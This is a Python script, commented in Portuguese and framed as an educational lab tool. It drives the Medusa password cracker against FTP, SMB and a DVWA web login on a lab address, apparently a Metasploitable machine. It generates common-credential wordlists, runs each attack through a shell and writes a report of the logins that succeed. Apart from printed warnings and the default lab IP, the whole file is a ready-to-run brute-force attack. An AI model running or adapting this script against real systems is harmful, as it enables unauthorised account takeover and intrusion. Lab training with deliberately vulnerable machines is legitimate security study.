#!/usr/bin/env python3
"""
🔓 Brute Force Analyzer - Ferramenta Educacional
⚠️  Apenas para ambientes controlados e autorizados
"""

import subprocess
import time
import os
from datetime import datetime

class BruteForceAnalyzer:
    def __init__(self, target_ip="192.168.56.101"):
        self.target = target_ip
        self.results = []
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def run_medusa_attack(self, service, user_list, pass_list, options=""):
        """Executa ataque Medusa e retorna resultados"""
        print(f"\n🎯 Executando ataque {service}...")
        
        cmd = f"medusa -h {self.target} -U {user_list} -P {pass_list} -M {service} {options} -t 2 -f"
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            attack_result = {
                'service': service,
                'timestamp': self.timestamp,
                'command': cmd,
                'output': result.stdout,
                'success': 'SUCCESS' in result.stdout
            }
            
            self.results.append(attack_result)
            return attack_result
            
        except Exception as e:
            print(f"❌ Erro no ataque {service}: {e}")
            return None
    
    def generate_wordlists(self):
        """Gera wordlists básicas para testes"""
        os.makedirs('wordlists', exist_ok=True)
        
        # Wordlist de usuários comuns
        with open('wordlists/common_users.txt', 'w') as f:
            users = ['admin', 'root', 'user', 'test', 'guest', 'msfadmin']
            f.write('\n'.join(users))
        
        # Wordlist de senhas comuns
        with open('wordlists/common_passwords.txt', 'w') as f:
            passwords = [
                'password', '123456', 'admin', 'test', '1234',
                '12345', 'msfadmin', 'toor', 'root', 'secret'
            ]
            f.write('\n'.join(passwords))
        
        print("✅ Wordlists geradas em /wordlists/")
    
    def ftp_brute_force(self):
        """Ataque FTP no Metasploitable"""
        return self.run_medusa_attack('ftp', 'wordlists/common_users.txt', 'wordlists/common_passwords.txt')
    
    def http_brute_force(self):
        """Ataque HTTP no DVWA"""
        # Prepara wordlist específica para DVWA
        with open('dvwa_custom.txt', 'w') as f:
            f.write('admin\npassword\n123456\n')
        
        options = '-m DIR:/dvwa/login.php -m FORM:\"username^USER^&password^PASS^&Login^Login^\" -m DENY-SIGNAL:\"Login failed\"'
        return self.run_medusa_attack('http', 'wordlists/common_users.txt', 'dvwa_custom.txt', options)
    
    def smb_brute_force(self):
        """Ataque SMB no Metasploitable"""
        return self.run_medusa_attack('smbnt', 'wordlists/common_users.txt', 'wordlists/common_passwords.txt')
    
    def generate_report(self):
        """Gera relatório dos testes"""
        report = f"""
🔓 RELATÓRIO DE TESTES DE FORÇA BRUTA
📅 Data: {self.timestamp}
🎯 Alvo: {self.target}
========================================

"""
        for result in self.results:
            status = "✅ SUCESSO" if result['success'] else "❌ FALHA"
            report += f"""
SERVIÇO: {result['service']}
STATUS: {status}
COMANDO: {result['command']}
SAÍDA:
{result['output']}
{'='*50}
"""
        
        # Salva relatório
        with open('brute_force_report.txt', 'w') as f:
            f.write(report)
        
        print("📊 Relatório salvo em: brute_force_report.txt")
        return report

# Demonstração educacional
if __name__ == "__main__":
    print("🔓 BRUTE FORCE ANALYZER - FINS EDUCACIONAIS")
    print("⚠️  EXECUTE APENAS EM AMBIENTES AUTORIZADOS")
    print("=" * 50)
    
    analyzer = BruteForceAnalyzer()
    
    # Gera wordlists
    analyzer.generate_wordlists()
    
    # Executa ataques de demonstração
    print("\n🚀 INICIANDO TESTES CONTROLADOS...")
    
    # FTP Brute Force
    analyzer.ftp_brute_force()
    time.sleep(2)
    
    # HTTP Brute Force (DVWA)
    analyzer.http_brute_force()
    time.sleep(2)
    
    # SMB Brute Force
    analyzer.smb_brute_force()
    
    # Relatório final
    print("\n📋 GERANDO RELATÓRIO...")
    analyzer.generate_report()
    
    print("\n🎉 DEMONSTRAÇÃO CONCLUÍDA!")
    print("💡 Lembre-se: Use este conhecimento para fortalecer defesas!")
